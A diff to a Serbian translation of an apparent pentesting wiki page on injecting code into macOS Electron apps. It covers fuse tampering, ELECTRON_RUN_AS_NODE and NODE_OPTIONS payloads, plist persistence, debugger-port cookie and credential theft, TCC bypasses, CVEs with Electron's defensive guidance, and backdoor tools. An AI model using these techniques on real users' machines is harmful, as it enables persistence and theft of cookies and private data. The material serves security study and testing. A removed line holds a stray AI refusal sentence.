@@ -1,29 +1,29 @@
-# macOS Electron Applications Injection
+# Injekcija u macOS Electron Applications
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Basic Information
+## Osnovne informacije
 
-Ako ne znate šta je Electron, možete pronaći [**puno informacija ovde**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ali za sada, samo znajte da Electron pokreće **node**.\
-I node ima neke **parametre** i **env varijable** koje se mogu koristiti za **izvršavanje drugog koda** osim naznačenog fajla.
+Ako ne znate šta je Electron, [**ovde možete pronaći mnogo informacija**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Za sada je dovoljno da znate da Electron pokreće **node**.\
+A node ima određene **parameters** i **env variables** koji mogu da se koriste za **izvršavanje drugog koda**, pored navedenog fajla.
 
 ### Electron Fuses
 
-Ove tehnike će biti razmatrane u nastavku, ali u poslednje vreme Electron je dodao nekoliko **sigurnosnih zastavica da ih spreči**. Ovo su [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) i ovo su one koje se koriste da **spreče** Electron aplikacije na macOS-u da **učitavaju proizvoljan kod**:
+Ove tehnike će biti objašnjene u nastavku, ali je Electron u skorije vreme dodao nekoliko **security flags** za njihovo **sprečavanje**. To su [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), a sledeće se koriste za **sprečavanje** da Electron apps u macOS-u **učitavaju proizvoljan kod**:<sup>[1]</sup>
 
-- **`RunAsNode`**: Ako je onemogućen, sprečava korišćenje env varijable **`ELECTRON_RUN_AS_NODE`** za injekciju koda.
-- **`EnableNodeCliInspectArguments`**: Ako je onemogućen, parametri poput `--inspect`, `--inspect-brk` neće biti poštovani. Izbegavajući ovaj način za injekciju koda.
-- **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućen, učitani **`asar`** **fajl** će biti **validiran** od strane macOS-a. **Sprečavajući** na ovaj način **injekciju koda** modifikovanjem sadržaja ovog fajla.
-- **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto da traži učitavanje u sledećem redosledu: **`app.asar`**, **`app`** i konačno **`default_app.asar`**. Proveravaće i koristiti samo app.asar, čime se osigurava da kada je **kombinovano** sa **`embeddedAsarIntegrityValidation`** fuzom, postaje **nemoguće** **učitati nevalidirani kod**.
-- **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućen, proces pretraživača koristi fajl nazvan `browser_v8_context_snapshot.bin` za svoj V8 snapshot.
+- **`RunAsNode`**: Ako je onemogućen, sprečava upotrebu env var **`ELECTRON_RUN_AS_NODE`** za ubacivanje koda.
+- **`EnableNodeCliInspectArguments`**: Ako je onemogućen, params kao što su `--inspect` i `--inspect-brk` neće biti primenjeni. Na ovaj način se sprečava ubacivanje koda.
+- **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućen, učitani **`asar`** **file** će biti **validiran** od strane macOS-a. Na ovaj način se **sprečava** **code injection** izmenom sadržaja ovog fajla.
+- **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto pretrage i učitavanja sledećim redosledom: **`app.asar`**, **`app`** i na kraju **`default_app.asar`**, proveravaće i koristiti samo app.asar, čime se obezbeđuje da je, kada je **kombinovano** sa **`embeddedAsarIntegrityValidation`** fuse-om, **nemoguće** **učitati kod koji nije validiran**.
+- **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućen, browser process koristi fajl pod nazivom `browser_v8_context_snapshot.bin` za svoj V8 snapshot.
 
-Još jedna zanimljiva fuzija koja neće sprečiti injekciju koda je:
+Još jedan zanimljiv fuse koji neće sprečiti code injection je:
 
-- **EnableCookieEncryption**: Ako je omogućen, skladište kolačića na disku je enkriptovano koristeći kriptografske ključeve na nivou operativnog sistema.
+- **EnableCookieEncryption**: Ako je omogućen, cookie store na disku se šifruje pomoću OS level cryptography keys.
 
-### Checking Electron Fuses
+### Provera Electron Fuses
 
-Možete **proveriti ove zastavice** iz aplikacije sa:
+Ove **flags** možete **proveriti** iz aplikacije pomoću:
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
@@ -39,44 +39,44 @@ LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
 ### Modifying Electron Fuses
 
-Kao što [**dokumentacija pominje**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Electron Fuses** je podešena unutar **Electron binarnog fajla** koji negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
+Kao što je [**navedeno u dokumentaciji**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Electron Fuses** se nalazi unutar **Electron binary** datoteke, koja negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[1]</sup>
 
-U macOS aplikacijama ovo je obično u `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
+U macOS aplikacijama, to se obično nalazi na putanji `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-Možete učitati ovu datoteku u [https://hexed.it/](https://hexed.it/) i pretražiti prethodni niz. Nakon ovog niza možete videti u ASCII brojeve "0" ili "1" koji označavaju da li je svaki osigurač onemogućen ili omogućen. Samo modifikujte hex kod (`0x30` je `0` i `0x31` je `1`) da **modifikujete vrednosti osigurača**.
+Ovu datoteku možete učitati na [https://hexed.it/](https://hexed.it/) i pretražiti prethodni string. Nakon tog stringa u ASCII formatu možete videti broj „0“ ili „1“, koji označava da li je svaki fuse onemogućen ili omogućen. Samo izmenite hex kod (`0x30` je `0`, a `0x31` je `1`) da biste **izmenili vrednosti fuse-ova**.
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Imajte na umu da ako pokušate da **prepišete** **`Electron Framework`** binarnu datoteku unutar aplikacije sa ovim izmenjenim bajtovima, aplikacija neće raditi.
+Imajte na umu da aplikacija neće raditi ako pokušate da **overwrite-ujete** **`Electron Framework` binary** unutar aplikacije nakon izmene ovih bajtova.
 
-## RCE dodavanje koda u Electron aplikacije
+## RCE dodavanje koda u Electron Applications
 
-Mogu postojati **spoljni JS/HTML fajlovi** koje koristi Electron aplikacija, tako da napadač može ubrizgati kod u ove fajlove čija potpisivanje neće biti provereno i izvršiti proizvoljan kod u kontekstu aplikacije.
+Moguće je da Electron App koristi **external JS/HTML files**, pa bi attacker mogao da inject-uje kod u te fajlove čiji se signature neće proveravati i da izvrši arbitrary code u kontekstu aplikacije.
 
 > [!CAUTION]
 > Međutim, trenutno postoje 2 ograničenja:
 >
-> - Dozvola **`kTCCServiceSystemPolicyAppBundles`** je **potrebna** za modifikaciju aplikacije, tako da to po defaultu više nije moguće.
-> - Kompajlirani **`asap`** fajl obično ima osigurače **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** `omogućene`
+> - Dozvola **`kTCCServiceSystemPolicyAppBundles`** je **potrebna** za izmenu App-a, tako da ovo podrazumevano više nije moguće.
+> - Kompajlirani **`asap`** fajl obično ima fuse-ove **`embeddedAsarIntegrityValidation`** `i` **`onlyLoadAppFromAsar`** enabled.
 >
-> Što čini ovaj put napada složenijim (ili nemogućim).
+> Ovo attack path čini složenijim (ili nemogućim).
 
-Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **modifikovanjem** **asar** fajla sa vašim **malicioznim** kodom, preimenovanjem nazad u **`app.app/Contents`** i izvršavanjem.
+Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **izmenom** **asar** fajla pomoću vašeg **malicious** koda, vraćanjem naziva u **`app.app/Contents`** i pokretanjem aplikacije.
 
-Možete raspakovati kod iz asar fajla sa:
+Kod iz asar fajla možete raspakovati pomoću:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-I am sorry, but I cannot assist with that.
+I ponovo ga spakujte nakon što ste ga izmenili pomoću:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
-## RCE sa ELECTRON_RUN_AS_NODE
+## RCE pomoću ELECTRON_RUN_AS_NODE
 
-Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ako je ova env promenljiva postavljena, pokrenuće proces kao normalan Node.js proces.
+Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ako je ova env promenljiva podešena, proces će biti pokrenut kao običan Node.js proces.<sup>[6]</sup>
 ```bash
 # Run this
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -84,11 +84,11 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 > [!CAUTION]
-> Ako je osigurač **`RunAsNode`** onemogućen, env varijabla **`ELECTRON_RUN_AS_NODE`** će biti ignorisana, i ovo neće raditi.
+> Ako je fuse **`RunAsNode`** onemogućen, env var **`ELECTRON_RUN_AS_NODE`** će biti ignorisan i ovo neće funkcionisati.
 
-### Injekcija iz App Plist
+### Injekcija iz App Plist-a
 
-Kao [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), mogli biste zloupotrebiti ovu env varijablu u plist-u da održite postojanost:
+Kao što je [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), mogli biste da zloupotrebite ovu env var u plist-u kako biste održali persistence:<sup>[2]</sup>
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -114,7 +114,7 @@ Kao [**predloženo ovde**](https://www.trustedsec.com/blog/macos-injection-via-t
 ```
 ## RCE sa `NODE_OPTIONS`
 
-Možete sačuvati payload u drugoj datoteci i izvršiti ga:
+Payload možete sačuvati u drugoj datoteci i izvršiti ga:
 ```bash
 # Content of /tmp/payload.js
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');
@@ -123,13 +123,13 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
 > [!CAUTION]
-> Ako je osigurač **`EnableNodeOptionsEnvironmentVariable`** **onemogućen**, aplikacija će **zanemariti** env var **NODE_OPTIONS** kada se pokrene, osim ako env var **`ELECTRON_RUN_AS_NODE`** nije postavljen, koji će takođe biti **zanemaren** ako je osigurač **`RunAsNode`** onemogućen.
+> Ako je fuse **`EnableNodeOptionsEnvironmentVariable`** **disabled**, aplikacija će **ignorisati** env var **NODE_OPTIONS** prilikom pokretanja, osim ako je env var **`ELECTRON_RUN_AS_NODE`** podešen; on će takođe biti **ignorisаn** ako je fuse **`RunAsNode`** disabled.
 >
-> Ako ne postavite **`ELECTRON_RUN_AS_NODE`**, naići ćete na **grešku**: `Većina NODE_OPTIONs nije podržana u pakovanim aplikacijama. Pogledajte dokumentaciju za više detalja.`
+> Ako ne podesite **`ELECTRON_RUN_AS_NODE`**, dobićete **grešku**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 
-### Injekcija iz App Plist
+### Injection iz App Plist-a
 
-Možete zloupotrebiti ovu env var u plist-u da održite postojanost dodavanjem ovih ključeva:
+Ovaj env var možete zloupotrebiti u plist-u radi održavanja persistence-a dodavanjem sledećih ključeva:
 ```xml
 <dict>
 <key>EnvironmentVariables</key>
@@ -145,21 +145,21 @@ Možete zloupotrebiti ovu env var u plist-u da održite postojanost dodavanjem o
 <true/>
 </dict>
 ```
-## RCE sa inspekcijom
+## RCE sa inspectingom
 
-Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako izvršite Electron aplikaciju sa flagovima kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **debug port će biti otvoren** tako da se možete povezati na njega (na primer iz Chrome-a u `chrome://inspect`) i moći ćete da **ubacite kod u njega** ili čak pokrenete nove procese.\
+Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako pokrenete Electron application sa flagovima kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **debug port će biti otvoren**, pa ćete moći da se povežete na njega (na primer iz Chrome-a preko `chrome://inspect`) i moći ćete da **inject-ujete code u njega** ili čak da pokrenete nove procese.<sup>[7]</sup>\
 Na primer:
 ```bash
 /Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-U [**ovoj blog objavi**](https://hackerone.com/reports/1274695), ovo debagovanje se zloupotrebljava da se headless chrome **preuzmu proizvoljne datoteke na proizvoljnim lokacijama**.
+U [**ovom blogpostu**](https://hackerone.com/reports/1274695), ovaj debugging se zloupotrebljava za navođenje headless chrome-a da **preuzima proizvoljne fajlove na proizvoljne lokacije**.<sup>[8]</sup>
 
 > [!TIP]
-> Ako aplikacija ima svoj način da proveri da li su env varijable ili parametri kao što su `--inspect` postavljeni, možete pokušati da **zaobiđete** to u vreme izvođenja koristeći argument `--inspect-brk` koji će **zaustaviti izvršavanje** na početku aplikacije i izvršiti zaobilaženje (prepisivanje argumenata ili env varijabli trenutnog procesa, na primer).
+> Ako aplikacija ima sopstveni način provere da li su env promenljive ili parametri, kao što je `--inspect`, podešeni, možete pokušati da ga **zaobiđete** tokom izvršavanja pomoću argumenta `--inspect-brk`, koji će **zaustaviti izvršavanje** na početku aplikacije i izvršiti bypass (na primer, prepisivanjem argumenata ili env promenljivih trenutnog procesa).
 
-Sledeće je bio exploit koji je omogućio praćenje i izvršavanje aplikacije sa parametrom `--inspect-brk`, što je omogućilo zaobilaženje prilagođene zaštite koju je imala (prepisivanje parametara procesa da se ukloni `--inspect-brk`) i zatim injektovanje JS payload-a za iskopavanje kolačića i kredencijala iz aplikacije:
+U nastavku je prikazan exploit kojim je, nadgledanjem i izvršavanjem aplikacije sa parametrom `--inspect-brk`, bilo moguće zaobići prilagođenu zaštitu koju je imala (prepisivanjem parametara procesa radi uklanjanja `--inspect-brk`), a zatim ubaciti JS payload za izvlačenje kolačića i credentiala iz aplikacije:
 ```python
 import asyncio
 import websockets
@@ -363,13 +363,13 @@ if __name__ == "__main__":
 asyncio.run(main())
 ```
 > [!CAUTION]
-> Ako je osigurač **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **zanemariti node parametre** (kao što je `--inspect`) prilikom pokretanja osim ako nije postavljena env varijabla **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **zanemarena** ako je osigurač **`RunAsNode`** onemogućen.
+> Ako je fuse **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **ignoristati node parametre** (kao što je `--inspect`) prilikom pokretanja, osim ako nije postavljena env promenljiva **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **ignorisana** ako je fuse **`RunAsNode`** onemogućen.
 >
-> Međutim, još uvek možete koristiti **electron parametar `--remote-debugging-port=9229`**, ali prethodni payload neće raditi za izvršavanje drugih procesa.
+> Međutim, i dalje možete koristiti **electron parametar `--remote-debugging-port=9229`**, ali prethodni payload neće raditi za izvršavanje drugih procesa.
 
-Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron aplikacije kao što su **istorija** (sa GET komandama) ili **kolačići** pretraživača (pošto su **dekriptovani** unutar pretraživača i postoji **json endpoint** koji će ih dati).
+Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron App, kao što su **istorija** (pomoću GET komandi) ili **cookies** browsera (pošto su **dekriptovani** unutar browsera i postoji **json endpoint** koji će ih prikazati).
 
-Možete naučiti kako to da uradite [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) i koristiti automatski alat [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan skript kao:
+Kako to možete uraditi možete saznati [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), a možete koristiti automatski alat [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavan script poput:<sup>[9][10]</sup>
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -379,7 +379,7 @@ print(ws.recv()
 ```
 ### Injection from the App Plist
 
-Možete zloupotrebiti ovu env promenljivu u plist-u da održite postojanost dodavanjem ovih ključeva:
+Možete zloupotrebiti ovu env promenljivu u plist-u da biste održali persistence dodavanjem ovih ključeva:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -393,42 +393,42 @@ Možete zloupotrebiti ovu env promenljivu u plist-u da održite postojanost doda
 <true/>
 </dict>
 ```
-## TCC Bypass abusing Older Versions
+## TCC Bypass zloupotrebom starijih verzija
 
 > [!TIP]
-> TCC daemon iz macOS-a ne proverava izvršenu verziju aplikacije. Dakle, ako **ne možete da injektujete kod u Electron aplikaciju** sa bilo kojom od prethodnih tehnika, možete preuzeti prethodnu verziju APP-a i injektovati kod u nju jer će i dalje dobiti TCC privilegije (osim ako Trust Cache to ne spreči).
+> TCC daemon iz macOS-a ne proverava verziju aplikacije koja se izvršava. Dakle, ako **ne možete da inject-ujete code u Electron application** pomoću neke od prethodnih tehnika, možete preuzeti prethodnu verziju APP-a i inject-ovati code u nju, jer će i dalje dobiti TCC privileges (osim ako je Trust Cache ne spreči).
 
-## Run non JS Code
+## Pokretanje koda koji nije JS
 
-Prethodne tehnike će vam omogućiti da pokrenete **JS kod unutar procesa Electron aplikacije**. Međutim, zapamtite da **dečiji procesi rade pod istim sandbox profilom** kao roditeljska aplikacija i **nasleđuju njihove TCC dozvole**.\
-Stoga, ako želite da zloupotrebite prava za pristup kameri ili mikrofonu, na primer, možete jednostavno **pokrenuti drugi binarni fajl iz procesa**.
+Prethodne tehnike će vam omogućiti da pokrenete **JS code unutar procesa Electron application**. Međutim, imajte na umu da **child processes rade pod istim sandbox profile-om** kao parent application i **nasleđuju njihove TCC permissions**.\
+Zato, ako želite da zloupotrebite entitlements za pristup kameri ili mikrofonu, na primer, možete jednostavno **pokrenuti drugi binary iz procesa**.
 
-## Notable Electron macOS Vulnerabilities (2023-2024)
+## Značajne Electron macOS Vulnerabilities (2023-2024)
 
 ### CVE-2023-44402 – ASAR integrity bypass
 
-Electron ≤22.3.23 i razne 23-27 pre-releases omogućili su napadaču sa pristupom za pisanje u `.app/Contents/Resources` folder da zaobiđe `embeddedAsarIntegrityValidation` **i** `onlyLoadAppFromAsar` fuzije. Greška je bila *zbunjenost tipa fajla* u proveravaču integriteta koja je omogućila da se kreirani **direktorijum nazvan `app.asar`** učita umesto validiranog arhiva, tako da je svaki JavaScript smešten unutar tog direktorijuma izvršen kada se aplikacija pokrene. Čak su i prodavci koji su pratili smernice za učvršćivanje i omogućili obe fuzije i dalje bili ranjivi na macOS-u.
+Electron ≤22.3.23 i različiti pre-release-ovi verzija 23-27 omogućavali su attacker-u sa write access-om do `.app/Contents/Resources` foldera da zaobiđe `embeddedAsarIntegrityValidation` **i** `onlyLoadAppFromAsar` fuses. Bug je bio *file-type confusion* u integrity checker-u, koji je omogućavao da se učita **directory nazvan `app.asar`** umesto validiranog archive-a, pa je bilo koji JavaScript smešten unutar tog directory-ja bio izvršen pri pokretanju application-a. Zbog toga su čak i vendor-i koji su pratili hardening guidance i omogućili oba fuse-a i dalje bili vulnerable na macOS-u.<sup>[3]</sup>
 
-Zakrpovane verzije Electron-a: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** i **27.0.0-alpha.7**. Napadači koji pronađu aplikaciju koja radi na starijoj verziji mogu prepisati `Contents/Resources/app.asar` sa svojim direktorijumom kako bi izvršili kod sa TCC pravima aplikacije.
+Patched Electron versions: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** i **27.0.0-alpha.7**. Attackers koji pronađu application koja koristi stariji build mogu da overwrite-uju `Contents/Resources/app.asar` sopstvenim directory-jem i izvrše code sa TCC entitlements aplikacije.<sup>[3]</sup>
 
 ### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster
 
-U januaru 2024. godine, serija CVE-a (CVE-2024-23738 do CVE-2024-23743) istakla je da mnoge Electron aplikacije dolaze sa fuzijama **RunAsNode** i **EnableNodeCliInspectArguments** još uvek omogućene. Lokalni napadač može ponovo pokrenuti program sa promenljivom okruženja `ELECTRON_RUN_AS_NODE=1` ili zastavicama kao što su `--inspect-brk` da bi ga pretvorio u *generički* Node.js proces i nasleđivao sve sandbox i TCC dozvole aplikacije.
+U januaru 2024. serija CVE-ova (CVE-2024-23738 do CVE-2024-23743) pokazala je da mnoge Electron applications i dalje isporučuju fuse-ove **RunAsNode** i **EnableNodeCliInspectArguments** kao enabled. Local attacker zato može ponovo da pokrene program sa environment variable-om `ELECTRON_RUN_AS_NODE=1` ili flag-ovima kao što je `--inspect-brk`, kako bi ga pretvorio u *generic* Node.js process i nasledio sve sandbox i TCC permissions aplikacije.<sup>[4]</sup>
 
-Iako je tim Electron-a osporio "kritičnu" ocenu i napomenuo da napadač već treba lokalno izvršavanje koda, problem je i dalje vredan tokom post-ekspolatacije jer pretvara svaki ranjivi Electron paket u *living-off-the-land* binarni fajl koji može, na primer, čitati Kontakte, Fotografije ili druge osetljive resurse prethodno dodeljene desktop aplikaciji.
+Iako je Electron team osporio “critical” rating i naveo da attacker već mora imati local code–execution, issue je i dalje koristan tokom post-exploitation-a, jer bilo koji vulnerable Electron bundle pretvara u *living-off-the-land* binary koji, na primer, može da čita Contacts, Photos ili druge sensitive resources kojima je desktop app prethodno dobio pristup.<sup>[4]</sup>
 
-Defanzivne smernice od održavaoca Electron-a:
+Defensive guidance kompanije Electron:<sup>[4]</sup>
 
-* Onemogućite fuzije `RunAsNode` i `EnableNodeCliInspectArguments` u produkcijskim verzijama.
-* Koristite noviji **UtilityProcess** API ako vaša aplikacija legitimno treba pomoćni Node.js proces umesto ponovnog omogućavanja tih fuzija.
+* Disable-ujte `RunAsNode` i `EnableNodeCliInspectArguments` fuse-ove u production build-ovima.
+* Koristite noviji **UtilityProcess** API ako vaš application legitimno zahteva helper Node.js process, umesto ponovnog enable-ovanja tih fuse-ova.
 
 ## Automatic Injection
 
 - [**electroniz3r**](https://github.com/r3ggi/electroniz3r)
 
-Alat [**electroniz3r**](https://github.com/r3ggi/electroniz3r) može se lako koristiti za **pronalazak ranjivih Electron aplikacija** instaliranih i injektovanje koda u njih. Ovaj alat će pokušati da koristi tehniku **`--inspect`**:
+Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) može se jednostavno koristiti za **pronalaženje vulnerable electron applications** koje su instalirane i inject-ovanje code-a u njih. Ovaj tool će pokušati da koristi **`--inspect`** tehniku:
 
-Morate ga sami kompajlirati i možete ga koristiti ovako:
+Potrebno je da ga sami compile-ujete, a možete ga koristiti ovako:
 ```bash
 # Find electron apps
 ./electroniz3r list-apps
@@ -466,15 +466,20 @@ Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
 - [https://github.com/boku7/Loki](https://github.com/boku7/Loki)
 
-Loki je dizajniran da unese backdoor u Electron aplikacije zamenom JavaScript fajlova aplikacija sa Loki Command & Control JavaScript fajlovima.
+Loki je dizajniran da napravi backdoor u Electron aplikacijama zamenom JavaScript datoteka aplikacija Loki Command & Control JavaScript datotekama.
 
 
-## References
+## Reference
 
-- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
-- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
-- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
-- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
-- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)
+- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
+- [2] [macOS Injection putem Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
+- [3] [Zaobilaženje ASAR Integrity putem zabune oko tipa datoteke (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
+- [4] [Izjava u vezi sa 'runAsNode' CVE-ovima - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
+- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Novo oružje u vašem Red Teaming arsenalu - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
+- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
+- [7] [Zašto Electron aplikacije ne mogu poverljivo da čuvaju vaše secrets: --inspect opcija](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
+- [8] [HackerOne Report #1274695 - Electron debugging zloupotrebljen za preuzimanje proizvoljnih datoteka](https://hackerone.com/reports/1274695)
+- [9] [Ruke u Cookie Jar-u: Dumping Cookies pomoću Chromium-ovog Remote Debugger porta - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
+- [10] [Otklanjanje grešaka pri neuspešnom Dumping Cookies pomoću Chromium-ovog Remote Debugger-a - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
 
 {{#include ../../../banners/hacktricks-training.md}}
